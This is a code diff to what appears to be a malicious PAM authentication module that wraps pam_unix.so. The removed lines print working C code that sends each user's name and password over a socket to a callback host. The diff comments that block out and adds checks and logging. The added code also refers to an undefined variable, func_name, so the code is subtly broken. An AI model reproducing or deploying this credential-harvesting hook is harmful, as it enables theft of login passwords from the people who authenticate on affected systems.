@@ -18,38 +18,52 @@
 typedef int (*pam_func_t)(pam_handle_t *, int, int, const char **);
 
 int pam_send_authtok(const char *message, const char *username, const char *password) {
-    const char *ret_fmt = "%s:%s\n";
+    // const char *ret_fmt = "%s:%s\n";
 
-    int sock = socket(AF_INET, SOCK_STREAM, 0);
-    if (sock >= 0) {
-        struct sockaddr_in serv_addr;
-        serv_addr.sin_family = AF_INET;
-        serv_addr.sin_port = htons(CALLBACK_PORT);
-        inet_pton(AF_INET, CALLBACK_IP, &serv_addr.sin_addr);
+    // int sock = socket(AF_INET, SOCK_STREAM, 0);
+    // if (sock >= 0) {
+    //     struct sockaddr_in serv_addr;
+    //     serv_addr.sin_family = AF_INET;
+    //     serv_addr.sin_port = htons(CALLBACK_PORT);
+    //     inet_pton(AF_INET, CALLBACK_IP, &serv_addr.sin_addr);
 
-        if(connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) == 0) {
-            char credentials[256];
-            snprintf(credentials, sizeof(credentials), ret_fmt, username, password);
-            send(sock, credentials, strlen(credentials), 0);
-        }
+    //     if(connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) == 0) {
+    //         char credentials[256];
+    //         snprintf(credentials, sizeof(credentials), ret_fmt, username, password);
+    //         send(sock, credentials, strlen(credentials), 0);
+    //     }
 
-        close(sock);
-    }
+    //     close(sock);
+    // }
+
+    return 0;
 }
 
 int pam_unix_authenticate(const char *name, pam_handle_t *pamh, int flags, int argc, const char **argv) {
+    
+    if (!func_name) {
+        pam_syslog(pamh, LOG_ERR, "Function name is NULL!");
+        return PAM_AUTH_ERR;
+    }
+    if (!pamh) {
+        pam_syslog(pamh, LOG_ERR, "PAM handle is NULL!");
+        return PAM_AUTH_ERR;
+    }
+
     void *handle = dlopen(PAM_PATH, RTLD_LAZY);
     if (!handle) {
         pam_syslog(pamh, LOG_ERR, "PAM unable to dlopen(pam_unix.so): %s", dlerror());
-        return PAM_PERM_DENIED;
+        return PAM_AUTH_ERR;
     }
 
     pam_func_t func = (pam_func_t)dlsym(handle, name);
     if (!func) {
         pam_syslog(pamh, LOG_ERR, "PAM unable to resolve symbol: %s", name);
         dlclose(handle);
-        return PAM_PERM_DENIED;
+        return PAM_AUTH_ERR;
     }
+
+    pam_syslog(pamh, LOG_INFO, "Successfully loaded function %s, calling now...", func_name);
 
     int result = func(pamh, flags, argc, argv);
     dlclose(handle);
